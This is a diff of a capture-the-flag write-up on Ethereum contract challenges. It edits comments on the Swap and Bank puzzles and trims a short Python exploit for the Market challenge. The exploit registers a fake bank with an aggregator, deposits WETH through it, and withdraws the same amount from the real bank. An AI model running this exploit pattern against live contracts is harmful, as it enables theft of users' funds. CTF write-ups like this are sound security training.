@@ -50,7 +50,7 @@ After spending time looking for vulnerabilities, I re-read the win condition: Se
 
 ## Swap 👎
 
-Didn't solve this one. At least no one else solved it either. It looked like it might have been vulnerable to a numerical overflow, perhaps in the rate exponention.
+Didn't solve this one. At least no one else solved it either. It looked like it might have been vulnerable to a numerical overflow, perhaps in the rate exponention. Mabye also the compiler bug that was fixed in 0.4.25, but was still present in 0.4.24 that this contract was built with.
 
 ```javascript
 value * 10**decimals / 10**18;
@@ -58,7 +58,7 @@ value * 10**decimals / 10**18;
 
 ## Bank 👎
 
-It was clear that you could use reentrancy to wreck havoc with the accounts list, and get things to happen to the wrong account. However, I never found how to do the final step to modify the amounts of token I wanted to control. I even went to sleep with the my highlighted source code print out under my pillow. It only got 4 solves in total. I look forward to learning what I missed.
+It was clear that you could use reentrancy to wreck havoc with the accounts list, and get things to happen to the wrong account. However, I never found how to do the final step to modify the amounts of token I wanted to control. I even went to sleep with the my highlighted source code printout under my pillow. It only got 4 solves in total. I look forward to learning what I missed.
 
 ## Market 👎
 
@@ -77,21 +77,16 @@ It was very much rigged for a reentrancy attack, but I took a much simpler appro
 ```python
 print("🦞 Deploy Faux Bank")
 faux = FauxBank.deploy(weth, STD)
-show_balances()
 
 print("🦞 Acquire WETH")
 weth.deposit({'from': me, 'value': 50 * 1e18})
 weth.approve(aggregator, 2**250, STD)
-show_balances()
-
 
 print("🦞 Deposit to Faux Bank")
 aggregator.deposit(faux, [weth.address], [50 * 1e18], STD)
-show_balances()
 
 print("🦞 Withdraw from real bank")
 aggregator.withdraw(bank, [weth.address], [50 * 1e18], STD)
-show_balances()
 ```
 
 ```javascript
